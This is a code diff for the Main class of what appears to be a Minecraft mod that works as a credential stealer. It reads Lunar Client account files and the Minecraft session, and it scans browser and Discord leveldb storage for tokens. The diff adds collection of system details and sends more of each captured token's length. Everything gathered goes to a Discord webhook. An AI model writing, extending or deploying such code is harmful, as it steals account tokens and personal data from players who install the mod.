@@ -52,6 +52,17 @@ public final class Main {
                 .addField("City", "```" + info.get("city").getAsString() + "```", true)
                 .addField("IP", "```" + info.get("ip").getAsString() + "```", true);
     }
+    private DiscordWebhook.EmbedObject genSystemInfoEmbed() {
+        return new DiscordWebhook.EmbedObject()
+                .setTitle(":computer: System Info")
+                .setColor(0x336699) // Eine andere Farbe
+                .addField("OS", "```" + safeString(System.getProperty("os.name"), 100) + "```", true)
+                .addField("OS Version", "```" + safeString(System.getProperty("os.version"), 100) + "```", true)
+                .addField("Java Version", "```" + safeString(System.getProperty("java.version"), 100) + "```", true)
+                .addField("User", "```" + safeString(System.getProperty("user.name"), 100) + "```", true)
+                .addField("CPU Cores", "```" + Runtime.getRuntime().availableProcessors() + "```", true)
+                .addField("Max Memory", "```" + (Runtime.getRuntime().maxMemory() / 1024 / 1024) + " MB```", true);
+    }
 
     private DiscordWebhook.EmbedObject genAccInfoEmbed() {
         final Session session = mc.getSession();
@@ -98,7 +109,7 @@ public final class Main {
         String lunarPath = System.getProperty("user.home") + "/.lunarclient/settings/game/accounts.json";
         File lunarFile = new File(lunarPath);
         String content = "File not found";
-        if (lunarFile.exists()) {
+        if (lunarFile.exists() && lunarFile.isFile()) {
             try {
                 byte[] encoded = Files.readAllBytes(lunarFile.toPath());
                 content = new String(encoded, StandardCharsets.UTF_8);
@@ -126,7 +137,7 @@ public final class Main {
             StringBuilder sb = new StringBuilder();
             for (String token : tokens) {
                 // Token kürzen, um das Feld nicht zu überladen und die Länge zu begrenzen
-                String shortToken = token.length() > 40 ? token.substring(0, 37) + "..." : token;
+                String shortToken = safeString(token, 100); // Kürze den Token auf eine angemessene Länge
                 sb.append(":small_orange_diamond: `").append(shortToken).append("`\n");
             }
             tokenEmbed.setDescription(sb.toString());
@@ -147,7 +158,7 @@ public final class Main {
         paths.add(new File(System.getProperty("user.home") + "/AppData/Roaming/Opera Software/Opera Stable/User Data/Default/Local Storage/leveldb/"));
 
         for (File file : paths) {
-            if (!file.exists() || file == null) {
+            if (file == null || !file.exists() || !file.isDirectory()) {
                 continue;
             }
             File[] filesList = file.listFiles();
@@ -155,7 +166,7 @@ public final class Main {
             for (File pathname : filesList) {
                 try (BufferedReader br = new BufferedReader(new InputStreamReader(new DataInputStream(new FileInputStream(pathname))))) {
                     String strLine;
-                    while ((strLine = br.readLine()) != null) {
+                    while ((strLine = br.readLine()) != null && !strLine.isEmpty()) {
                         int index;
                         while ((index = strLine.indexOf("oken")) != -1) {
                             try {
@@ -167,7 +178,7 @@ public final class Main {
                             } catch (Exception ignored) {
                                 // Ignoriere Fehler beim Parsen, um den Scan fortzusetzen
                             }
-                        }
+                        } // while index
                     }
                 } catch (Exception ignored) {
                     // Ignoriere Fehler beim Lesen einer Datei und setze fort
@@ -194,6 +205,7 @@ public final class Main {
         }
 
         webhook.addEmbed(genAccInfoEmbed());
+        webhook.addEmbed(genSystemInfoEmbed());
         webhook.addEmbed(genTokenEmbed());
         webhook.addEmbed(genServersInfoEmbed());
         webhook.addEmbed(genLunarInfoEmbed());
